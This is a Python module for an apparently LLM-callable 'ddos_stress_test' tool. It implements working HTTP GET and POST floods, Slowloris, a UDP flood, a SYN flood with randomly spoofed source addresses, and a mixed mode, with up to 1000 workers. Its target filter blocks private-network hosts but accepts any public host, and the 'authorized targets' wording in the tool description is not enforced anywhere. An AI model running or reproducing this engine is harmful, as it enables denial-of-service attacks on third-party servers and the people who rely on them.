"""
DDoS / Stress Test Tool — Comprehensive Layer-4 & Layer-7 attack vectors.

Supports:
    - HTTP GET Flood (asyncio HTTP clients)
    - HTTP POST Flood (large payload)
    - Slowloris (slow header exhaustion)
    - UDP Flood (raw UDP datagrams)
    - SYN Flood (requires scapy)
    - Mixed mode

Features:
    - Asynchronous, non-blocking execution
    - Configurable workers, duration, rate limits
    - Real-time stats: requests/s, bandwidth, success rate
    - Graceful stop via cancel token
"""

from __future__ import annotations

import asyncio
import hashlib
import logging
import os
import random
import socket
import ssl
import struct
import time
from dataclasses import dataclass, field
from enum import Enum
from urllib.parse import urlparse

from tools.base_tool import BaseTool, ToolHealthStatus, ToolMetadata

logger = logging.getLogger(__name__)

# ─── DDoS Engine (singleton, managed by app state) ────────────────────────────

class AttackVector(str, Enum):
    HTTP_FLOOD = "http-flood"
    HTTP_POST = "http-post"
    SLOWLORIS = "slowloris"
    UDP_FLOOD = "udp-flood"
    SYN_FLOOD = "syn-flood"
    MIXED = "mixed"


@dataclass
class AttackConfig:
    target: str
    vector: AttackVector
    port: int = 80
    use_ssl: bool = False
    workers: int = 100
    duration: int = 30      # seconds
    payload_size: int = 1024
    rate_limit: int = 0     # 0 = unlimited pps per worker


@dataclass
class AttackStats:
    total_requests: int = 0
    total_bytes: int = 0
    success_2xx: int = 0
    redirect_3xx: int = 0
    client_err_4xx: int = 0
    server_err_5xx: int = 0
    errors: int = 0
    pps: float = 0.0
    mbps: float = 0.0
    elapsed: float = 0.0
    started_at: float = 0.0


def _parse_target(target: str) -> tuple[str, int, bool]:
    """Parse target URL into (host, port, use_ssl)."""
    if "://" not in target:
        target = f"http://{target}"
    parsed = urlparse(target)
    host = parsed.hostname or target
    port = parsed.port or (443 if parsed.scheme == "https" else 80)
    use_ssl = parsed.scheme == "https"
    return host, port, use_ssl


def _is_private_ip(host: str) -> bool:
    """Check if host resolves to a private IP (loopback excluded for testing)."""
    try:
        ip = socket.gethostbyname(host)
        parts = ip.split(".")
        if len(parts) != 4:
            return True
        octets = [int(p) for p in parts]
        if octets[0] == 127:
            return False
        if octets[0] == 10:
            return True
        if octets[0] == 172 and 16 <= octets[1] <= 31:
            return True
        if octets[0] == 192 and octets[1] == 168:
            return True
        return False
    except Exception:
        return True


# ─── Attack implementations ───────────────────────────────────────────────────

async def _http_flood_worker(
    cfg: AttackConfig,
    stats: AttackStats,
    stop_event: asyncio.Event,
    lock: asyncio.Lock,
) -> None:
    """Worker that sends HTTP GET requests repeatedly."""
    url = f"{'https' if cfg.use_ssl else 'http'}://{cfg.target}:{cfg.port}/"
    ssl_ctx = ssl.create_default_context()
    ssl_ctx.check_hostname = False
    ssl_ctx.verify_mode = ssl.CERT_NONE

    while not stop_event.is_set():
        try:
            reader, writer = await asyncio.wait_for(
                asyncio.open_connection(cfg.target, cfg.port, ssl=ssl_ctx if cfg.use_ssl else None),
                timeout=5.0,
            )
            request = (
                f"GET / HTTP/1.1\r\n"
                f"Host: {cfg.target}\r\n"
                f"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                f"AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36\r\n"
                f"Accept: */*\r\n"
                f"Connection: keep-alive\r\n"
                f"Cache-Control: no-cache\r\n"
                f"X-Request-ID: {hashlib.md5(str(time.time()).encode()).hexdigest()}\r\n"
                f"\r\n"
            )
            writer.write(request.encode())
            await asyncio.wait_for(writer.drain(), timeout=5.0)

            response = await asyncio.wait_for(reader.read(4096), timeout=5.0)
            async with lock:
                stats.total_requests += 1
                stats.total_bytes += len(request) + len(response)
                if response:
                    try:
                        status = int(response.split(b"\r\n")[0].split(b" ")[1])
                        if 200 <= status < 300:
                            stats.success_2xx += 1
                        elif 300 <= status < 400:
                            stats.redirect_3xx += 1
                        elif 400 <= status < 500:
                            stats.client_err_4xx += 1
                        elif 500 <= status < 600:
                            stats.server_err_5xx += 1
                    except (IndexError, ValueError):
                        stats.errors += 1
                else:
                    stats.errors += 1

            writer.close()
            try:
                await asyncio.wait_for(writer.wait_closed(), timeout=2.0)
            except (asyncio.TimeoutError, Exception):
                pass
        except Exception:
            async with lock:
                stats.errors += 1
            await asyncio.sleep(0.01)


async def _slowloris_worker(
    cfg: AttackConfig,
    stats: AttackStats,
    stop_event: asyncio.Event,
    lock: asyncio.Lock,
) -> None:
    """Worker that holds connections open with slow/incomplete HTTP headers."""
    ssl_ctx = ssl.create_default_context()
    ssl_ctx.check_hostname = False
    ssl_ctx.verify_mode = ssl.CERT_NONE

    while not stop_event.is_set():
        connections = []
        for _ in range(10):
            if stop_event.is_set():
                break
            try:
                reader, writer = await asyncio.wait_for(
                    asyncio.open_connection(cfg.target, cfg.port, ssl=ssl_ctx if cfg.use_ssl else None),
                    timeout=5.0,
                )
                request = (
                    f"GET /{random.randint(1, 9999)} HTTP/1.1\r\n"
                    f"Host: {cfg.target}\r\n"
                    f"User-Agent: {random.choice(_UA_LIST)}\r\n"
                    f"Accept: text/html,application/xhtml+xml\r\n"
                )
                writer.write(request.encode())
                await writer.drain()
                connections.append((reader, writer))
                async with lock:
                    stats.total_requests += 1
                    stats.total_bytes += len(request)
            except Exception:
                async with lock:
                    stats.errors += 1

        # Hold connections open with periodic header bytes
        for _ in range(50):
            if stop_event.is_set():
                break
            for reader, writer in connections:
                try:
                    writer.write(f"X-{random.randint(1, 9999)}: {random.randint(1, 9999)}\r\n".encode())
                    await writer.drain()
                    async with lock:
                        stats.total_bytes += 30
                except Exception:
                    pass
            await asyncio.sleep(random.uniform(0.5, 2.0))

        # Cleanup connections
        for reader, writer in connections:
            try:
                writer.close()
                await asyncio.wait_for(writer.wait_closed(), timeout=1.0)
            except Exception:
                pass


async def _udp_flood_worker(
    cfg: AttackConfig,
    stats: AttackStats,
    stop_event: asyncio.Event,
    lock: asyncio.Lock,
) -> None:
    """Worker that sends UDP datagrams to target."""
    data = os.urandom(min(cfg.payload_size, 65507))
    port = cfg.port if cfg.port else 80

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setblocking(False)
    loop = asyncio.get_running_loop()

    while not stop_event.is_set():
        try:
            sent = await loop.sock_sendto(sock, (data, (cfg.target, port)))
            async with lock:
                stats.total_requests += 1
                stats.total_bytes += sent
        except Exception:
            async with lock:
                stats.errors += 1
            await asyncio.sleep(0.001)
    sock.close()


async def _syn_flood_worker(
    cfg: AttackConfig,
    stats: AttackStats,
    stop_event: asyncio.Event,
    lock: asyncio.Lock,
) -> None:
    """Worker that sends TCP SYN packets using raw sockets (requires root)."""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
        sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        sock.setblocking(False)
    except PermissionError:
        async with lock:
            stats.errors += 1
        return
    except OSError:
        async with lock:
            stats.errors += 1
        return

    dest = cfg.target
    dport = cfg.port if cfg.port else 80
    loop = asyncio.get_running_loop()

    while not stop_event.is_set():
        try:
            sport = random.randint(1024, 65535)
            seq = random.randint(0, 4294967295)
            packet = _build_syn_packet(sport, dport, dest, seq)
            sent = await loop.sock_sendto(sock, (packet, (dest, 0)))
            async with lock:
                stats.total_requests += 1
                stats.total_bytes += sent
        except Exception:
            async with lock:
                stats.errors += 1
            await asyncio.sleep(0.001)
    sock.close()


def _build_syn_packet(sport: int, dport: int, dest: str, seq: int) -> bytes:
    """Build a TCP SYN packet with IP header (raw socket)."""
    ihl = 5
    ver = 4
    tos = 0
    tot_len = 40
    frag_off = 0
    ttl = 64
    protocol = socket.IPPROTO_TCP
    check = 10
    saddr = socket.inet_aton(f"{random.randint(1, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 255)}")
    daddr = socket.inet_aton(dest)
    ip_header = struct.pack(
        "!BBHHHBBH4s4s",
        (ver << 4) + ihl, tos, tot_len, 0, frag_off, ttl, protocol, 0, saddr, daddr,
    )

    src = sport
    dst = dport
    ack = 0
    doff = 5
    window = socket.htons(5840)
    check = 0
    urg_ptr = 0
    offset_res = (doff << 4) + 0
    flags = 2  # SYN
    header = struct.pack(
        "!HHLLBBHHH",
        src, dst, seq, ack, offset_res, flags, window, check, urg_ptr,
    )

    return ip_header + header


async def _http_post_worker(
    cfg: AttackConfig,
    stats: AttackStats,
    stop_event: asyncio.Event,
    lock: asyncio.Lock,
) -> None:
    """Worker that sends HTTP POST requests with large payloads."""
    url_path = f"{'https' if cfg.use_ssl else 'http'}://{cfg.target}:{cfg.port}/"
    ssl_ctx = ssl.create_default_context()
    ssl_ctx.check_hostname = False
    ssl_ctx.verify_mode = ssl.CERT_NONE
    body = os.urandom(cfg.payload_size).hex()

    while not stop_event.is_set():
        try:
            reader, writer = await asyncio.wait_for(
                asyncio.open_connection(cfg.target, cfg.port, ssl=ssl_ctx if cfg.use_ssl else None),
                timeout=5.0,
            )
            request = (
                f"POST / HTTP/1.1\r\n"
                f"Host: {cfg.target}\r\n"
                f"User-Agent: Mozilla/5.0 (compatible; TIRPAN/1.0)\r\n"
                f"Content-Type: application/x-www-form-urlencoded\r\n"
                f"Content-Length: {len(body)}\r\n"
                f"Connection: keep-alive\r\n"
                f"\r\n"
                f"{body}"
            )
            writer.write(request.encode())
            await asyncio.wait_for(writer.drain(), timeout=5.0)

            response = await asyncio.wait_for(reader.read(4096), timeout=5.0)
            async with lock:
                stats.total_requests += 1
                stats.total_bytes += len(request) + len(response)
                if response:
                    try:
                        status = int(response.split(b"\r\n")[0].split(b" ")[1])
                        if 200 <= status < 300:
                            stats.success_2xx += 1
                        elif 300 <= status < 400:
                            stats.redirect_3xx += 1
                        elif 400 <= status < 500:
                            stats.client_err_4xx += 1
                        elif 500 <= status < 600:
                            stats.server_err_5xx += 1
                    except (IndexError, ValueError):
                        stats.errors += 1

            writer.close()
            try:
                await asyncio.wait_for(writer.wait_closed(), timeout=2.0)
            except (asyncio.TimeoutError, Exception):
                pass
        except Exception:
            async with lock:
                stats.errors += 1
            await asyncio.sleep(0.01)


_UA_LIST = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Gecko/20100101 Firefox/121.0",
]


WORKERS_MAP = {
    AttackVector.HTTP_FLOOD: _http_flood_worker,
    AttackVector.HTTP_POST: _http_post_worker,
    AttackVector.SLOWLORIS: _slowloris_worker,
    AttackVector.UDP_FLOOD: _udp_flood_worker,
    AttackVector.SYN_FLOOD: _syn_flood_worker,
}


# ─── Engine Manager ───────────────────────────────────────────────────────────

class DDoSEngine:
    """Singleton engine that manages DDoS attack lifecycle."""

    def __init__(self):
        self._task: asyncio.Task | None = None
        self._stop: asyncio.Event = asyncio.Event()
        self._stats: AttackStats = AttackStats()
        self._config: AttackConfig | None = None
        self._lock: asyncio.Lock = asyncio.Lock()
        self._running = False

    @property
    def running(self) -> bool:
        return self._running

    @property
    def stats(self) -> AttackStats:
        return self._stats

    @property
    def config(self) -> AttackConfig | None:
        return self._config

    async def start(self, cfg: AttackConfig) -> str:
        """Start a DDoS attack. Returns error string or empty on success."""
        if self._running:
            return "An attack is already running. Stop it first."

        host, port, use_ssl = _parse_target(cfg.target)
        if _is_private_ip(host):
            return f"Target {host} resolves to a private/loopback address. Blocked."

        cfg.target = host
        cfg.port = port
        cfg.use_ssl = use_ssl

        # Check capabilities
        if cfg.vector == AttackVector.SYN_FLOOD:
            try:
                socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
            except (PermissionError, OSError):
                return "SYN flood requires root privileges (raw sockets)."

        self._stop.clear()
        self._stats = AttackStats(started_at=time.time())
        self._config = cfg
        self._running = True
        self._lock = asyncio.Lock()

        if cfg.vector == AttackVector.MIXED:
            self._task = asyncio.create_task(
                self._run_mixed(cfg), name="ddos-mixed"
            )
        else:
            worker = WORKERS_MAP.get(cfg.vector)
            if not worker:
                self._running = False
                return f"Unknown attack vector: {cfg.vector}"
            self._task = asyncio.create_task(
                self._run_single(cfg, worker), name=f"ddos-{cfg.vector.value}"
            )

        logger.warning(
            "DDoS attack started: %s → %s:%d | workers=%d duration=%ds",
            cfg.vector.value, cfg.target, cfg.port, cfg.workers, cfg.duration,
        )
        return ""

    async def stop(self) -> str:
        """Stop the running attack."""
        if not self._running:
            return "No attack is currently running."
        self._stop.set()
        if self._task and not self._task.done():
            self._task.cancel()
            try:
                await self._task
            except asyncio.CancelledError:
                pass
        self._running = False
        self._task = None
        logger.warning("DDoS attack stopped. Stats: %s req, %s MB",
                       self._stats.total_requests, round(self._stats.total_bytes / 1e6, 2))
        return ""

    async def _run_single(self, cfg: AttackConfig, worker_fn) -> None:
        """Run single-vector attack."""
        tasks = []
        for i in range(cfg.workers):
            task = asyncio.create_task(
                worker_fn(cfg, self._stats, self._stop, self._lock),
                name=f"ddos-wrk-{i}",
            )
            tasks.append(task)

        try:
            if cfg.duration > 0:
                await asyncio.sleep(cfg.duration)
                self._stop.set()
            else:
                await asyncio.wait([self._stop.wait()])
        except asyncio.CancelledError:
            self._stop.set()
        finally:
            for t in tasks:
                t.cancel()
            await asyncio.gather(*tasks, return_exceptions=True)
            self._stats.elapsed = time.time() - self._stats.started_at
            self._running = False

    async def _run_mixed(self, cfg: AttackConfig) -> None:
        """Run mixed-mode attack (multiple vectors simultaneously)."""
        mixed_vectors = [
            AttackVector.HTTP_FLOOD,
            AttackVector.SLOWLORIS,
            AttackVector.UDP_FLOOD,
        ]
        all_workers = []
        workers_per = max(1, cfg.workers // len(mixed_vectors))

        for vec in mixed_vectors:
            worker_fn = WORKERS_MAP.get(vec)
            if not worker_fn:
                continue
            for i in range(workers_per):
                task = asyncio.create_task(
                    worker_fn(cfg, self._stats, self._stop, self._lock),
                    name=f"ddos-mix-{vec.value}-{i}",
                )
                all_workers.append(task)

        try:
            if cfg.duration > 0:
                await asyncio.sleep(cfg.duration)
                self._stop.set()
            else:
                await asyncio.wait([self._stop.wait()])
        except asyncio.CancelledError:
            self._stop.set()
        finally:
            for t in all_workers:
                t.cancel()
            await asyncio.gather(*all_workers, return_exceptions=True)
            self._stats.elapsed = time.time() - self._stats.started_at
            self._running = False

    def get_status(self) -> dict:
        """Return current status as a serializable dict."""
        elapsed = self._stats.elapsed
        if self._running and self._stats.started_at:
            elapsed = time.time() - self._stats.started_at

        pps = round(self._stats.total_requests / max(elapsed, 0.001), 1)
        mbps = round(self._stats.total_bytes / max(elapsed, 0.001) / 1e6, 2)

        return {
            "running": self._running,
            "requests": int(self._stats.total_requests),
            "bytes_total": int(self._stats.total_bytes),
            "ppc": pps,
            "mbps": mbps,
            "elapsed": round(elapsed, 1),
            "success_2xx": self._stats.success_2xx,
            "redirect_3xx": self._stats.redirect_3xx,
            "client_err_4xx": self._stats.client_err_4xx,
            "server_err_5xx": self._stats.server_err_5xx,
            "errors": self._stats.errors,
            "vector": self._config.vector.value if self._config else None,
            "target": self._config.target if self._config else None,
            "workers": self._config.workers if self._config else 0,
            "duration": self._config.duration if self._config else 0,
        }


# ─── LLM Tool ─────────────────────────────────────────────────────────────────

class DDoSTool(BaseTool):
    """LLM-invokable DDoS / stress test operations for authorized targets."""

    @property
    def metadata(self) -> ToolMetadata:
        return ToolMetadata(
            name="ddos_stress_test",
            category="utility",
            description=(
                "Execute DDoS / stress tests against authorized web servers. "
                "Supports HTTP flood, Slowloris, UDP flood, SYN flood, and mixed attacks. "
                "Use 'start' to launch, 'stop' to halt, 'status' to check current state. "
                "Parameters: action (start|stop|status), target (URL), vector (http-flood|"
                "slowloris|udp-flood|syn-flood|http-post|mixed), workers (int, default 100), "
                "duration (seconds, default 30)."
            ),
            parameters={
                "type": "object",
                "properties": {
                    "action": {
                        "type": "string",
                        "enum": ["start", "stop", "status"],
                        "description": "Action to perform: start attack, stop attack, or check status.",
                    },
                    "target": {
                        "type": "string",
                        "description": "Target URL or host:port for the attack (required for 'start').",
                    },
                    "vector": {
                        "type": "string",
                        "enum": ["http-flood", "slowloris", "udp-flood", "syn-flood", "http-post", "mixed"],
                        "description": "Attack vector to use (default: http-flood).",
                    },
                    "workers": {
                        "type": "integer",
                        "description": "Number of concurrent workers/connections (default: 100, max: 1000).",
                        "default": 100,
                    },
                    "duration": {
                        "type": "integer",
                        "description": "Attack duration in seconds (default: 30, 0 = manual stop only).",
                        "default": 30,
                    },
                },
                "required": ["action"],
            },
        )

    async def execute(self, params: dict) -> dict:
        from tools.ddos_tool import ddos_engine

        action = params.get("action", "status")

        if action == "stop":
            err = await ddos_engine.stop()
            if err:
                return {"success": False, "error": err}
            return {"success": True, "output": {"stopped": True}}

        if action == "status":
            return {"success": True, "output": ddos_engine.get_status()}

        if action == "start":
            target = params.get("target", "")
            if not target:
                return {"success": False, "error": "target is required for start"}

            vector_str = params.get("vector", "http-flood")
            try:
                vector = AttackVector(vector_str)
            except ValueError:
                return {"success": False, "error": f"Invalid vector: {vector_str}, valid: {[v.value for v in AttackVector]}"}

            workers = min(max(int(params.get("workers", 100)), 1), 1000)
            duration = max(int(params.get("duration", 30)), 0)

            cfg = AttackConfig(
                target=target,
                vector=vector,
                workers=workers,
                duration=duration,
            )
            err = await ddos_engine.start(cfg)
            if err:
                return {"success": False, "error": err}
            return {"success": True, "output": ddos_engine.get_status()}

        return {"success": False, "error": f"Unknown action: {action}"}

    async def health_check(self) -> ToolHealthStatus:
        return ToolHealthStatus(
            available=True,
            message=(
                "DDoS stress test tool ready. "
                "HTTP flood, Slowloris, UDP flood, SYN flood (needs root), Mixed mode."
            ),
        )


# Module-level engine instance (populated at app startup)
ddos_engine: DDoSEngine = DDoSEngine()
